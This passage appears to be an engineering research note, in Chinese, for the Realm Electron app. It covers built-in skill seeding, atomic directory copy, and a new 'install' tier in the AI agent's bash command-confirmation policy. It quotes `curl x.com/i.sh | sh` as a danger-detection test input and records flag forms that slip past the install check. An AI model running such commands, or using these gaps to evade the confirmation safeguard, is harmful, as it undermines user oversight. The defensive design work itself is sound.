`agent-workspace.js` 的现有职责是**沙箱**（`resolveInside` / `createSandboxEnv` / 目录访问器），它 `module.exports` 出的 `getManagedSkillsDir()` 等是「路径派生」。播种是**跨边界的搬运**（构建期资源 → userData），它需要 `app.isPackaged`（Electron 依赖，`agent-workspace.js` 当前**不 require electron**），而沙箱层注入 `app` 会破坏 `tests/test-agent-workspace.js` 的纯 Node 可测性（该文件 21 例全部不 mock electron）。独立模块可以只 require `node:fs` / `node:path` / `node:crypto` + 一个**注入的** `isPackaged`/`resourcesPath` 参数，从而保持纯 Node 可单测。CONTEXT 的 `code_context` 已明确警告：「`skills-builtin/` 的**打包源**路径是另一条独立链路（`app.isPackaged` 分支），不要把两个概念混在一处」。

### Pattern 1: 按单技能目录粒度的自愈式播种（D-08 的实现形状）

**What:** 启动时扫随包源目录，逐个技能目录独立判定"是否需要覆盖"，需要则走「临时目录 → rename → 回滚」原子替换。

**When to use:** 每次 `app.whenReady` 启动一次（而非每次 Agent 重建时）。

**原型（openhanako `core/first-run.ts:252`，已读全文）：**

```ts
// Source: /Volumes/ZhiTai/Projects/github/openhanako/core/first-run.ts:252-274
function syncSkills(srcDir, dstDir) {
  fs.mkdirSync(dstDir, { recursive: true });

  const entries = fs.readdirSync(srcDir, { withFileTypes: true });
  for (const entry of entries) {
    if (!entry.isDirectory() || entry.name.startsWith(".")) continue;

    const skillSrc = path.join(srcDir, entry.name);
    const skillDst = path.join(dstDir, entry.name);

    // 只要源里有 SKILL.md 就同步整个目录
    if (!fs.existsSync(path.join(skillSrc, "SKILL.md"))) continue;

    try {
      safeCopyDir(skillSrc, skillDst);
    } catch (err) {
      errorBus.report(new AppError('SKILL_SYNC_FAILED', {
        cause: err instanceof Error ? err : new Error(String(err)),
        context: { skill: entry.name },
      }));
      // Continue with other skills, don't abort
    }
  }
}
```

**Realm 版必须保留的三点：** ① `entry.isDirectory()` + 点前缀跳过（防 `.DS_Store` 之类的目录）；② **`SKILL.md` 存在才算技能**（这同时是 D-11 的 seeded 身份判据）；③ **单技能失败 continue，不 abort**（一个技能坏掉不能让另两个不播种）。

**Realm 版需要增补的两点（原型没有）：** ① **差异检测先行**（D-09 要求覆盖前产诊断，原型是静默覆盖）；② **诊断进 Realm 形状**（对齐 `toRealmDiag` / `pushError`，而非 openhanako 的 `errorBus`）。

### Pattern 2: 原子目录替换 `safeCopyDir`（D-08 的原子性契约）

**What:** 不原地覆盖，而是「拷到临时目录 → 旧目录改名备份 → 临时目录改名就位 → 删备份」，任一步失败则回滚。

**实现（openhanako `shared/safe-fs.ts`，已读全文）：**

```js
// Source: /Volumes/ZhiTai/Projects/github/openhanako/shared/safe-fs.ts
// Atomic directory copy with rollback.
// 1. Copy src -> dst.tmp_{ts}
// 2. If dst exists, rename dst -> dst.bak_{ts}
// 3. Rename dst.tmp_{ts} -> dst
// 4. Delete dst.bak_{ts}
// Recovery: if step 3 fails, rename dst.bak_{ts} back to dst, clean up tmp.
export function safeCopyDir(src, dst) {
  const ts = Date.now();
  const tmpDst = `${dst}.tmp_${ts}`;
  const bakDst = `${dst}.bak_${ts}`;

  try {
    _copyDirRecursive(src, tmpDst);

    let hadExisting = false;
    if (fs.existsSync(dst)) {
      fs.renameSync(dst, bakDst);
      hadExisting = true;
    }

    try {
      fs.renameSync(tmpDst, dst);
    } catch (renameErr) {
      if (hadExisting) {
        try { fs.renameSync(bakDst, dst); } catch { /* best effort rollback */ }
      }
      _cleanupDir(tmpDst);
      throw renameErr;
    }

    if (hadExisting) _cleanupDir(bakDst);
  } catch (err) {
    _cleanupDir(tmpDst);
    throw new AppError('FS_COPY_FAILED', { cause: err, context: { src, dst } });
  }
}
```

**Realm 版可简化之处（3 处）：**

1. **`_copyDirRecursive` 里的 symlink 处理可以删掉。** 原型处理 `lstat.isSymbolicLink()` 分支是因为它拷贝任意用户内容。Realm 的**源是随包内容**（我们自己打的包，绝不含 symlink entry），目标是 app-owned 目录 —— symlink 分支是死代码。更安全的选择：**遇到 symlink 直接拒绝并产诊断**（fail-closed），而不是跟随复制。
2. **`AppError` / `errorBus` 换成 Realm 的诊断形状**（见 Pattern 4）。
3. **`_cleanupDir` 用 `fs.rmSync(p, { recursive: true, force: true })`** —— Node 22 内置，仓库已在 `tests/*` 中使用。

**Realm 版必须保留之处：** `timestamped` 的 tmp/bak 命名（避免并发冲突）、**回滚路径**（`renameSync` 失败时把 bak 改回来）、**失败后清理 tmp**。这三条是原子性的全部价值所在。

**⚠️ 单技能目录用 `rmSync` 清备份时的沙箱语义**：播种模块在**沙箱之外**运行（它是可信的 app-owned 写者，就像 `migrateAiMemory`），所以不需要 `resolveInside`。但**落地时必须保证 rename 的源与目标同卷** —— `agent-workspace/` 在 `~/Library/Application Support/realm*/`，若 tmp 与目标同父目录（`<skillDst>.tmp_<ts>`）则必然同卷，`renameSync` 保持原子。**不要把 tmp 放到 `os.tmpdir()`**（`/var/folders` 在 macOS 上可能是不同卷，`renameSync` 会 `EXDEV`）。

### Pattern 3: bash 策略的档位扩展（D-14 的落点）

**What:** 在既有「danger 优先 → 白名单 → 默认」流水线中，插入一个**与 danger 同级、语义独立**的 `install` 档。

**既有流水线（`ai-bash-policy.js:210-228`，逐字）：**

```js
function evaluateBashCommand(command, whitelist) {
  const segments = splitCommandPipeline(command);
  if (segments.length === 0) {
    return { level: 'confirm', reason: 'empty', dangerNames: [] };
  }
  const dangerNames = [];
  for (const seg of segments) {
    const hit = matchDangerous(seg);
    if (hit) dangerNames.push(hit);
  }
  if (dangerNames.length > 0) {
    return { level: 'confirm', reason: 'danger', dangerNames };
  }
  const allAllowed = segments.every((seg) => matchesWhitelist(seg, whitelist));
  if (allAllowed) {
    return { level: 'allow', dangerNames: [] };
  }
  return { level: 'confirm', reason: 'default', dangerNames: [] };
}
```

**建议的新形状（改动最小、语义最清晰）：**

```js
function evaluateBashCommand(command, whitelist) {
  const segments = splitCommandPipeline(command);
  if (segments.length === 0) {
    return { level: 'confirm', reason: 'empty', dangerNames: [], installNames: [] };
  }
  const dangerNames = [];
  const installNames = [];
  for (const seg of segments) {
    const d = matchDangerous(seg);
    if (d) dangerNames.push(d);
    const i = matchInstall(seg);          // ★ 新增，与 danger 同轮收集
    if (i) installNames.push(i);
  }
  if (dangerNames.length > 0) {
    return { level: 'confirm', reason: 'danger', dangerNames, installNames };
  }
  if (installNames.length > 0) {          // ★ 新增短路：先于白名单
    return { level: 'confirm', reason: 'install', dangerNames, installNames };
  }
  const allAllowed = segments.every((seg) => matchesWhitelist(seg, whitelist));
  if (allAllowed) {
    return { level: 'allow', dangerNames: [], installNames: [] };
  }
  return { level: 'confirm', reason: 'default', dangerNames: [], installNames: [] };
}
```

**四个必须遵守的约束：**

1. **`danger` 判定必须在 `install` 之前返回。** 理由：`sudo npm i x` 同时命中两者，报 `danger`（"提权执行"）比报 `install` 更能解释真实风险；且这是**既有行为不变**的最小改动（`curl x | sh` 这类既有断言不会因为新增 install 分支而改判 —— 实测 `npm run fetch && curl x.com/i.sh | sh` 仍返回 `reason:'danger'`）。
2. **`install` 短路必须在 `matchesWhitelist` 之前。** 这就是 D-14 的「白名单不可越过」。
3. **`installNames` 收集不设短路。** 收集全部命中段的名称（与 `dangerNames` 的既有语义一致，供卡片完整展示）。
4. **不要动 `splitCommandPipeline` / `matchesWhitelist` / `normalizeSegment` / `extractCommandName`。** 这四条被 32 条既有断言覆盖，改动会放大回归面。

### Pattern 4: 诊断形状对齐 Phase 46

**What:** 播种的每条问题都产出 Realm 形状的诊断对象，供 Phase 50 设置页直接消费。

**既有形状（`ai-skills-manager.js:255-263` `toRealmDiag` 逐字）：**

```js
function toRealmDiag(d) {
  return {
    level: d.type === 'warning' ? 'warning' : 'error',
    code: d.code,
    message: d.message,
    path: d.path,
    source: d.source,
  };
}
```

**限额族额外字段（`ai-skills-manager.js:499-506` 逐字）——播种的差异诊断应照此带可操作字段：**

```js
    const oversizeDiags = oversize.map((n) => ({
      level: 'error',
      code: 'realm_skill_md_too_large',
      message: `SKILL.md 超过正文上限：限额 ${n.limit} 字节，当前 ${n.currentValue} 字节（${n.path}）`,
      path: n.path,
      limit: n.limit,
      currentValue: n.currentValue,
    }));
```

**建议的播种诊断 code 命名（沿用 `realm_` 前缀约定，与 SDK 枚举区分）：**

| code | level | 触发 | 必需字段 |
|------|-------|------|----------|
| `realm_builtin_src_missing` | error | 随包 `skills-builtin/` 目录不存在或不可读（打包事故） | `path` |
| `realm_builtin_seed_overwritten` | **warning** | D-09：磁盘内容与随包内容不一致，即将覆盖 | `path`（技能目录）、`skillName`、`message` 含「已被随包版本覆盖」 |
| `realm_builtin_seed_failed` | error | 单个技能目录播种失败（拷贝/rename 抛错） | `path`、`skillName`、`message` 含原始错误 |
| `realm_builtin_src_invalid` | error | 源目录下某目录缺 `SKILL.md`（不构成技能，跳过） | `path` |

**为什么 D-09 的诊断必须是 `warning` 不是 `error`：** 它是**纯信息性**的 —— 覆盖会照常完成，功能没有降级。对照 `ai-skills-manager.js:530-533` 的 `realm_layout_violation`（同样 `warning`，同样是"告诉用户一件他不一定知道的事"）。

### Pattern 5: check_env.mjs 的形状（D-05 / D-07）

**参照实现已读全文（openhanako `skills2set/skill-creator/scripts/check_env.mjs`，469 行 Node ESM）。** 要点：

| 维度 | 参照实现的做法 | Realm 版建议 |
|------|----------------|--------------|
| **解释器覆盖环境变量** | `HANA_SKILL_CREATOR_PYTHON`（`check_env.mjs:5`），支持纯命令（`/usr/bin/python3`）与 JSON 数组（`["/path/py","-3"]`）两种形态（`:129-164`） | 改名 `REALM_SKILL_CREATOR_PYTHON`（避免与 Hanako 命名空间混淆） |
| **最低版本** | `const MIN_PYTHON_VERSION = [3, 10, 0]`（`:6`） | 保留 3.10（D-05 明确要求） |
| **超时** | `const CHECK_TIMEOUT_MS = 10_000`（`:8`），用于**每一处** `spawnSync`（`:189-192`、`:330-333`） | 保留 10s；注意 `spawnSync` 传 `timeout` 时失败会带 `result.error`，参照实现按 `result.error \|\| result.status !== 0` 双判 |
| **包检查方式** | 不 import 真包，用 `importlib.util.find_spec(module_name)` 探（`:47-62`），子进程只输出 JSON | 照抄 —— 避免真 import `anthropic` 产生副作用/耗时 |
| **capability 分组** | 8 组：`baseline` / `quick-validate` / `package-skill` / `aggregate-benchmark` / `eval-viewer` / `run-eval` / `description-optimize` / `run-loop`（`:23-32`） | **D-07 降低了脚本地位，capability 应大幅收缩** —— 建议只留 `baseline` / `quick-validate` / `eval-viewer` / `description-optimize`（去掉依赖 `claude` CLI 的 `run-eval` / `run-loop`：那两处在 Realm 语境下没有对应运行时） |
| **包规格表** | `PACKAGE_SPECS = { pyyaml: {packageName, moduleName:'yaml', purpose}, anthropic: {...} }`（`:10-21`） | 照抄形状（`packageName` ≠ `moduleName` 的映射是必需的：PyPI 名 `pyyaml`，import 名 `yaml`） |
| **输出契约** | 单一 JSON 打到 stdout（`:64-66`），**退出码 0 = ok / 1 = 失败**（`:467-469`） | 照抄 —— 让 AI 能稳定 parse |
| **失败码** | `python_not_found` / `python_version_unsupported` / `missing_dependency` / `missing_command` / `invalid_arguments` / `unknown_requirement` / `invalid_environment` / `dependency_check_failed`（`:266,276,390,408,368,352`） | 保留同一套 code（AI 可据此决定下一步） |
| **解释器探测顺序** | win32：`py -3` → `python` → `python3`；其他：`python3` → `python`（`:166-186`）。找到第一个满足最低版本的就用它（`:254-256`） | 照抄 |
| **不自动装依赖** | `installGuidance` 明确写 "Do not auto-install dependencies from this skill."（`:430`） | **必须保留这句**（SEED-03 / P1 的精神） |

**Realm 版最小可行形状：** 保留 `parseArgs` / `findPython` / `checkPackages` / `printResult` 四个函数与 `PACKAGE_SPECS` / `CAPABILITIES` 两张表，把 capability 收缩到 4 组，把环境变量改名为 `REALM_*`，其余照抄。**约 300-350 行。**

**⚠️ `check_env.mjs` 自身的执行成本（SKILL-09 的真实载体）：** 它的 shebang 是 `#!/usr/bin/env node`（`:1`），调用形式是 `node scripts/check_env.mjs`。而 **`node` 在 `DANGEROUS_INTERPRETERS` 里**（`ai-bash-policy.js:177-180`），所以 —— 与 D-05 的预期一致 —— **每次调用都会弹高风险确认卡片**。这是 SKILL-09 的可验对象，不是缺陷。

### Anti-Patterns to Avoid

- **把 `install` 档并入 `DANGEROUS_PATTERNS`：** D-14 明确禁止。语义不同（本机破坏 vs 网络取第三方代码），合并会让确认卡片文案退化成笼统的"高危操作"，用户失去判别依据；且 `dangerNames` 的既有断言会被污染。
- **把 `npx` 加进 `DANGEROUS_INTERPRETERS`：** 也不行。那张表按 `extractCommandName` 的**命令名精确匹配**（`DANGEROUS_INTERPRETERS.has(cmdName)`），只能表达"这个命令名危险"，无法表达"`npm` 只有 `i/install/ci` 子命令危险、`npm run` 不危险"。D-16 要求的子命令粒度在这张表里表达不了。
- **播种时把 `skills-builtin/` 的路径混进 `getWorkspaceDir()` 的派生链：** 那会导致沙箱 `resolveInside` 把打包源当成工作区内路径。打包源是**另一条链路**，与工作区无父子关系。
- **用 `fs.cpSync(src, dst, { recursive: true, force: true })` 直接原地覆盖：** 会在拷贝中途留下半成品（SEED-02 明确要求"不留半成品状态"）。必须走 tmp → rename。
- **把 tmp 目录建在 `os.tmpdir()`：** macOS 上 `/var/folders/...` 常与 `~/Library/Application Support` 不同卷，`fs.renameSync` 抛 `EXDEV`，回滚路径被激活但覆盖永远失败。tmp 必须与目标同父目录。
- **在 `agent-workspace.js` 里 `require('electron')`：** 会让 `tests/test-agent-workspace.js`（21 例，纯 Node）无法运行。
- **对 `skills-builtin/` 做「只播种一次」的早期返回：** D-08 要求**每个技能目录独立判定**。整目录一次性判定会导致「日后新增第三个内置技能永不播种」。
- **在 find-skills 正文里保留"如果没有导入入口，可以手动把目录放到 …"：** D-03 明确否决 —— 手改目录这条指引本身接近安装语义。
- **在 `THIRD_PARTY_NOTICES` 里省略"是否修改"：** P10 的阻断判据是**五要素**（来源仓库 + 固定 commit SHA + 许可证 + 是否修改 + 修改说明）。find-skills 是改写版，`modified` 是**必须**写的。

## Don't Hand-Roll

| 问题 | 不要自己造 | 用这个 | 为什么 |
|------|-----------|--------|--------|
| 原子目录替换 | 自己写"先删旧的再拷新的" | `safeCopyDir` 形状（tmp → bak → rename → rollback，见 Pattern 2） | 拷到一半崩溃会让 `managed-skills/<name>/` 只剩半个技能；rename 是同卷原子操作，是唯一能保证"要么旧要么新"的机制 |
| 差异检测 | 自己逐字节比较整棵目录树 | `crypto.createHash('sha256')` 逐文件 hash（仓库既有先例 `media-cache-manager.js:69,78,300,463,478`） | 逐文件 hash 可增量（大小不同立即不等）；逐字节比较要同时把两份内容读进内存 |
| 命令拆段 | 自己写 `cmd.split('&&')` | 既有 `splitCommandPipeline`（引号感知，`ai-bash-policy.js:36-98`） | 手写 split 会把 `echo "a;b"` 拆错；引号内的 `;`/`\|` 必须字面保留 |
| 命令名提取 | 自己写 `cmd.split(' ')[0]` | 既有 `extractCommandName`（跳过 `KEY=VALUE` 前缀、取 basename，`ai-bash-policy.js:106-114`） | 手写会漏 `FOO=1 npm i x`（实测该形态已被覆盖）与 `/usr/bin/python3` |
| 白名单匹配 | 自己写 glob | 既有 `matchesWhitelist`（前缀语义 + ` *` 通配，`ai-bash-policy.js:127-150`） | 语义已定型且有 32 例断言；重写会产生两套口径 |
| asar 内文件读取 | 自己拼 `app.asar/...` 路径 | `app.isPackaged` + `process.resourcesPath` + asarUnpack（`favorites-manager.js:287-299` 先例） | asar 内的路径对原生 `fopen`/`dlopen` 不可见；Electron 的 `fs` 补丁只覆盖部分 API |
| GitHub 仓库检索 | 自己 scrape GitHub HTML 页面 | `GET https://api.github.com/search/repositories`（**实测 200，返回结构化 JSON**） | 结构化字段（`license.spdx_id` / `default_branch` / `stargazers_count`）在 HTML 里要额外解析，且 `web_fetch` 会把 HTML 过 Readability 去噪，可能丢掉表格 |
| JSON 响应处理 | 以为 `web_fetch` 会转坏 JSON 而绕开 API | **实测：`web_fetch` 对 `application/json` 原样 `JSON.parse` + 美化输出**（`search-manager.js:1626-1628`） | 这是本阶段第一个被澄清的假设 —— 退路（`web_search` 定位 + `web_fetch` 读页面）**不需要启用** |
| Python 依赖探测 | 自己 `require('child_process').execSync('pip show pyyaml')` | `importlib.util.find_spec(module)`（参照实现 `check_env.mjs:47-62`） | `pip show` 输出格式随 pip 版本变；`find_spec` 直接回答"这个模块能不能 import"，且不真 import（无副作用） |
| 许可证文本 | 自己写免责声明 | 逐字保留上游 `LICENSE.txt` + `THIRD_PARTY_NOTICES` 记录 | Apache-2.0 §4 的义务是"随分发物携带许可证副本 + 标注修改"，自写摘要不满足 |

**Key insight:**
本阶段几乎全部"难"的部分都已经有了仓库内或参照实现的形状 —— **`ai-bash-policy.js` 的三档流水线、`toRealmDiag` 的诊断形状、`favorites-manager.js` 的 asar 路径分支、`migrateAiMemory` 的幂等先例、`safeCopyDir` 的原子替换、`check_env.mjs` 的环境探测**。真正的风险不在"不会写"，而在"写成了第二套口径"（第二套白名单匹配、第二套诊断形状、第二条 `skills-builtin` 路径派生链）。凡是既有代码已经定型了语义的地方，**复用它而不是重写它**就是本阶段最重要的工程纪律。

## Common Pitfalls

### Pitfall 1: `installNames` 字段打破 2 条既有断言

**What goes wrong:** 若 `evaluateBashCommand` 的 `allow` 分支返回 `{ level:'allow', dangerNames:[], installNames: [] }`，两条 `deepStrictEqual` 全对象断言立即失败。

**Why it happens:** 既有测试用 `deepStrictEqual` 而非逐字段 `strictEqual`：

```js
// tests/test-ai-bash-policy.js:158-165（逐字）
  test('白名单内无危险 → allow', () => {
    assert.deepStrictEqual(policy.evaluateBashCommand('npm run test', list), {
      level: 'allow', dangerNames: [],
    });
    assert.deepStrictEqual(policy.evaluateBashCommand('git status && ls -la', list), {
      level: 'allow', dangerNames: [],
    });
  });
```

**实测结论（已跑）：** 带 `installNames` 的 `allow` 对象 vs `{level:'allow', dangerNames:[]}` → `deepStrictEqual **FAIL**`。

**How to avoid:** 二选一，**必须显式决定**：
- **(A) 完整形状（推荐）**：所有分支都带 `installNames`，并同步把 `tests/test-ai-bash-policy.js:159-164` 两条断言改成 `{ level:'allow', dangerNames:[], installNames: [] }`。理由：Phase 48/49 的消费者（`verdict` 字段是 CONTEXT 明示的数据形状契约）拿到形状一致的对象，不需要 `verdict.installNames || []` 这类防御写法。
- **(B) 最小形状**：只在 `confirm` 分支带 `installNames`，`allow` 保持两字段 —— 实测**既有 32 例全绿，零测试改动**。代价是形状不一致（消费侧要容错）。

**Warning signs:** `node --test tests/test-ai-bash-policy.js` 报 `# fail 2`，且失败信息是 `Expected values to be strictly deep-equal`。

### Pitfall 2: CONTEXT 里的"29 例"是过时数字

**What goes wrong:** 若 planner 照 CONTEXT 的"29 例"规划测试增量（"29 → 45 例"），验收时会拿错基线。

**Why it happens:** Phase 46 之后 `tests/test-ai-bash-policy.js` 已经历过增补。

**实测基线（已跑）：**

```
tests/test-ai-bash-policy.js   → # tests 32 # pass 32 # fail 0
tests/test-ai-skills.js        → # tests 64 # pass 64 # fail 0
tests/test-agent-workspace.js  → # tests 21 # pass 21 # fail 0
```

`grep -c "^  test(\|^test(" tests/test-ai-bash-policy.js` = **32**，`describe` = **6** 组。

**How to avoid:** 以 `node --test tests/test-ai-bash-policy.js 2>&1 | grep "^# tests"` 的**实测输出**为基线，不用 CONTEXT 的数字。新增 install 用例后应 ≥ 32 + 新增数，且 `# fail 0`。

**Warning signs:** 计划文档里出现"29 例"。

### Pitfall 3: `make install` 会删掉正在运行的 `/Applications/Realm.app`

**What goes wrong:** `make install` 的第 2 步是 `rm -rf "/Applications/Realm.app"`。**本机此刻正在运行该 app**（`pgrep -fl Realm` → PID 25922 主进程 + 一组 helper，user-data-dir 为 `~/Library/Application Support/realm`）。若在运行中执行，会删除运行中的 bundle 并强制用户丢失当前会话。

**Why it happens:** Makefile 的 install target 没有任何"应用是否在运行"的检查：

```make
# Makefile:14-18（逐字）
install:
	npx electron-builder --mac dir
	rm -rf "$(INSTALL_DIR)/$(APP_NAME).app"
	cp -R "$(APP_PATH)" "$(INSTALL_DIR)/$(APP_NAME).app"
	@echo "已安装到 $(INSTALL_DIR)/$(APP_NAME).app"
```

**How to avoid:** D-12 要求的「实跑 `make install` 后验证」必须拆成**两个显式步骤**，且第一步是不可跳过的 checkpoint：
1. **先 `pgrep -fl "Realm"` 确认无用户实例**；有则请用户自行退出（**不要让 agent 代劳 kill**）。
2. **清理只按自身 PID**（记录 `make install` 前后差异）。AGENTS.md 的安全纪律原文：「验证 `/Applications` 正式 .app 前先 `pgrep` 查用户实例；清理只按自身 PID，路径模式 `pkill` 曾误杀生产版」。
3. 建议**验证用 Nightly 版**（`make install-nightly` 装到 `Realm Nightly.app`，与用户的 `Realm.app` 不冲突），把正式版的 `make install` 留到发布流程。

**Warning signs:** 计划里出现"直接跑 `make install` 然后启动验证"而没有前置的 `pgrep` checkpoint。

### Pitfall 4: `files: []` 把整个仓库打进 asar（含 RCE 说明书）

**What goes wrong:** `dist/builder-effective-config.yaml` 实测显示 `files: []` —— 即**没有 allowlist**，electron-builder 按默认规则打包仓库根的一切。实测已构建的 `app.asar`：

```
asar 总文件数: 16855
顶层条目数: 59
顶层: .claude, .gsd, .planning, .wzsh, .zcode, AGENTS.md, CLAUDE.md, CODEBUDDY.md,
      Makefile, README.md, ... dist 之外的一切, docs, tests, test, scripts, src, ...
.planning/ 内文件数: 545
  └─ .planning/research/PITFALLS.md   ← 内含 `npx skills add -g -y` 原文
     .planning/research/{ARCHITECTURE,FEATURES,STACK,SUMMARY}.md
     .planning/research/.cache/*.json（12+ 个）
     .planning/phases/**/46-CONTEXT.md 等
```

**这直接触及 P1 门禁的精神：** 即使我们把 `skills-builtin/find-skills/SKILL.md` 写到零安装语义完美通过，**随包发出的 `PITFALLS.md` 仍然是一份逐字的 `npx` 安装指令说明**。SEED-03 的字面判据（"内置技能文本不含…"）会通过，但门禁想挡的实际风险仍在分发物里。

**Why it happens:** electron-builder 在 `files` 缺省时不排除项目根目录下的文档/规划目录（它只排除 `node_modules` 开发依赖、`.git` 等内建项）。而且 `app.asar` 是**可解包读取的**（我自己就是用 30 行 Node 脚本把目录清单解出来的）——"藏在 asar 里"不构成任何防护。

**How to avoid:** 三选一，**至少做其一并在计划里留痕**：
- **(A) 加 `files` allowlist（推荐，但改动面最大）**：显式列出需要随包的文件/目录，一次性解决 `.planning` / `.claude` / `.gsd` / `tests` / `test` / `Makefile` 等泄漏。风险是需要完整枚举（漏一项就是运行期崩溃），所以必须过 `make install-nightly` + 实际启动验证。
- **(B) 只加 `!` 排除项（最小改动）**：`build.files` 里加 `["!.planning/**", "!.claude/**", "!.gsd/**", "!.wzsh/**", "!.zcode/**"]`。改动小、风险低，能精确摘掉 RCE 说明书。**注意 builder-effective-config 显示 `files: []` —— 加排除项后要重新核对配置文件是否被正确解析**（历史上 `files` 里 `!` 与 `**` 混用有过踩坑）。
- **(C) 明确记为技术债不修**：在 `docs/product/ai-agent-workspace.md` 或 REVIEW 里写明"asar 内含 `.planning/`（含安全研究文档），属已知问题，归后续发布加固"。

**Warning signs:** 构建后 `node -e "..."` 解 asar 目录清单，仍在顶层看到 `.planning`。**验证命令见 Validation Architecture 的 V-P1-3。**

> **判定责任在 planner：** CONTEXT 的 Phase Boundary 只写了"两件事"，`.planning` 泄漏严格说超出了 SEED-03 字面。但它是**同一次构建、同一个门禁精神**，且成本低。建议 planner 至少做 (B) 或 (C)，并在计划的 Risks 段明写这个决定。

### Pitfall 5: `web_search` 兜底时机搞反（D-01 的"仅作兜底"）

**What goes wrong:** 若 find-skills 正文让模型**先** `web_search` 再 `web_fetch`，会浪费一轮工具调用，且在多数场景下产出比 GitHub 搜索 API 更差的候选（搜索索引里的 GitHhub 技能仓库页往往不是结构化结果）。

**Why it happens:** API 类端点在模型的经验里"可能被限流"，所以模型倾向先搜。但实测本场景下 API 更稳：

- `GET /search/repositories` 实测 **HTTP 200**，一次返回 `full_name`（可直接拼 `https://github.com/<full_name>`）、`license.spdx_id`（候选清单的许可证字段）、`default_branch`、`stargazers_count`（排序依据）、`pushed_at`（活跃度）。
- `web_search` 返回的是**已渲染的搜索结果片段**，要拿同一个仓库 URL 还得再解析一次。

**How to avoid:** 正文里把顺序写死为「① `web_fetch` 打 GitHub 搜索 API → ② 逐条 `web_fetch` 核验仓库页 → ③ 只有在 API 返回失败/被限流时才 `web_search` 兜底」。**并把"API 是被允许的"显式写出来** —— 模型默认可能认为 `web_fetch` 只能取网页。

**Warning signs:** 实测对话里模型第一次工具调用是 `web_search`。

### Pitfall 6: 忘了「10 次/分钟」的搜索限流

**What goes wrong:** find-skills 引导模型做多轮检索（"再搜一次换关键词"）时，第 11 次调用返回 **403 + rate limit 消息**，模型把它当成"技能坏了"。

**Why it happens:** 实测 `GET https://api.github.com/rate_limit` → `"search": {"limit": 10, "remaining": 10, ...}`、`"core": {"limit": 60, ...}`。**search 类端点无鉴权时只有 10 次/分钟**（远低于 core 的 60/小时，因为 search 是独立配额）。

**How to avoid:** ① 正文明确告知"搜索端点每分钟最多 10 次，一次查询用 `per_page=10` 取够再筛，不要逐条查询"；② 把 `403` 列为**预期内的可解释错误**，处置是"告知用户稍后再试或改用 `web_search`"，不是报故障。

**Warning signs:** 计划里的 find-skills 正文写了"多轮细化检索"而没有 `per_page` 与限流提示。

### Pitfall 7: `LICENSE.txt` / `scripts/` 被误以为会产生诊断

**What goes wrong:** planner 可能为了"避免诊断"而把 `LICENSE.txt` 挪到技能目录外，或把 `scripts/` 排除在播种外 —— 这会同时破坏 D-17 的归属要求（"每个内置技能目录内保留上游 LICENSE.txt"）和 SKILL-09 的载体。

**Why it happens:** 直觉上"技能目录里放非 SKILL.md 文件"听起来像是"契约布局违约"。

**实测澄清（已跑 probe）：** 在 `managed-skills/skill-creator/` 放入 `SKILL.md` + `LICENSE.txt` + `scripts/quick_validate.py` + `scripts/check_env.mjs` + `references/schemas.md` + `assets/eval_review.html`：

```
加载到的技能: [{ name: 'skill-creator', source: 'managed', filePath: 'SKILL.md', entryDiags: 0 }]
_cache.diagnostics: EMPTY (0)
_cache.errors:      EMPTY (0)
promptBlock 长度: 0   （disable-model-invocation 生效）
```

**根因（读源码确认）：** ① `createSkillsEnv.listDir` 的非目录过滤**只作用于扫描根**（`ai-skills-manager.js:146` `if (!isScanRoot(p)) return res;`），技能目录内部的 entry 原样透传；② SDK 在目录内发现 `SKILL.md` 后**立即 return**，不再深入子目录（`node_modules/@earendil-works/pi-agent-core/dist/harness/skills.js:88-102`，第 102 行 `return { skills, diagnostics };`）；③ 非 `SKILL.md` 的文件被 `if (entry.name !== "SKILL.md") continue;`（同文件 `:89-90`）静默跳过，**不发任何诊断**。

**How to avoid:** 不要为"避免诊断"做任何特殊处理。直接把整个技能目录（含 LICENSE.txt 与 scripts/）拷进去。

**Warning signs:** 计划里出现"LICENSE.txt 需放在 managed-skills/ 之外"或"播种时需过滤非 SKILL.md 文件"。

### Pitfall 8: `npm --prefix X i Y` 类旗标前置形态不被覆盖

**What goes wrong:** 有人把 `npm -g i pkg` / `npm --prefix /tmp i pkg` 当成绕过口。

**实测澄清：**
- `npm -g i pkg` / `npm --global install x` → **已覆盖**（E-1 表的旗标容忍组 `(?:\s+-\S+)*` 吃掉 `-g`）。
- `npm --prefix /tmp i x`（取值旗标）→ **不覆盖**（需要"旗标带值"的表达，会让正则复杂度与误伤率上升）。

**How to avoid:** 承认这是启发式缺口，**写进文档的诚实边界**（Claude's Discretion 里已把"诚实边界的记录方式"交给 plan 期，正好一并在 `docs/product/ai-agent-workspace.md` §七 记录）。这与既有引擎的定位一致 —— `ai-bash-policy.js:10-12` 原文：「静态拆段无法覆盖全部 shell 语法（进程替换、命令替换 `$()` 等），本引擎定位为「降低误执行概率」的启发式，不是安全边界」。

**Warning signs:** 计划声称"完整覆盖所有包管理器安装形态"。

### Pitfall 9: 用 `entry.name.startsWith('.')` 之外的条件判"是不是技能目录"

**What goes wrong:** 若用"目录里有没有文件"或"目录名在某个硬编码清单里"判 seeded 身份，会与 D-11 冲突。

**Why it happens:** D-11 把 seeded 身份判定定义为**扫随包 `skills-builtin/` 的目录名集合，且每个目录须含 `SKILL.md`**。任何硬编码清单（在代码里写 `['find-skills','skill-creator']`）都会在"日后新增第三个内置技能"时静默失效 —— 与 D-08「单技能目录粒度」的理由同源。

**How to avoid:** seeded 判定 = `readdirSync(BUILTIN_SRC, {withFileTypes:true})` → 过滤 `isDirectory()` → 再过滤 `existsSync(path.join(d,'SKILL.md'))` → 取 `name` 集合。**零硬编码、零状态文件。**

**Warning signs:** 代码里出现字面量 `'find-skills'` 或 `'skill-creator'`（除了测试断言与 `THIRD_PARTY_NOTICES` 的文档记录）。

## Research Findings

> 本节按 research_priorities 的 A–G 顺序给出**可执行结论**。`[VERIFIED]` = 本次会话实跑命令或读了源码定义；`[INFERRED]` = 由已验证事实推导；`[ASSUMED]` = 未经本次验证。

### A. find-skills 零安装改写方案（D-01/D-02/D-03/D-04）

#### A-1. `web_fetch` 对 JSON 的返回形态 —— ✅ 已实证，**退路不需要启用**

**结论：`web_fetch` 对 `application/json` 原样返回，不经过 turndown。**

**[VERIFIED: search-manager.js:1622-1635]** —— 该函数体内逐字：

```js
  const contentType = res.headers.get('content-type') || '';
  const raw = await res.text();
  let text, format;

  if (contentType.includes('application/json')) {
    try { text = JSON.stringify(JSON.parse(raw), null, 2); } catch { text = raw; }
    format = 'json';
  } else if (contentType.includes('text/html')) {
    text = htmlToMarkdown(raw, currentUrl);
    format = 'markdown';
  } else {
    text = raw;
    format = 'text';
  }
```

**[VERIFIED: search-manager.js:1599-1606]** —— 请求头（决定了 GitHub API 是否接受）：

```js
